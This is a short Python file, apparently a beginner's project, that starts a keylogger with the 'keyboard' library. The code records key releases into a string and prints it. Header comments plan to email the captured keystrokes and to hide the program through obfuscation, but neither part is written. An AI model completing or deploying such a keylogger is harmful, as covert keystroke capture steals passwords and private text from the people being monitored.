#python -m pip install keyboard
# Ide: Record key strokes
# Send to some mail address
# Maybe hide itself using garbage, and encode everything as ascii?

import keyboard


class Keylogger:
    def __init__(self):
        self.log = "" #How we create locals for classes

    def setLog(self, msg):
        self.log = msg

    def getLog(self):
        print(self.log)

    def callback_function(self, event): #This function is called every time the on_release event happens (each time a key is lifted). Using the keyboard.hook gives for both UP and DOWN
        self.log += event.name
        #print(event.name)
        #print(self.log)
        if event.name == 'a':
            print(self.getLog())
   

    def startLogger(self):
        keyboard.on_release(self.callback_function)
        keyboard.wait()






if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.setLog("foo")
    #keylogger.getLog()
    keylogger.startLogger()

'''


def test(event):
    print("hello world")
    print(event.name)
    

keyboard.hook(test)


if __name__ == "__main__":

    keyboard.wait()
'''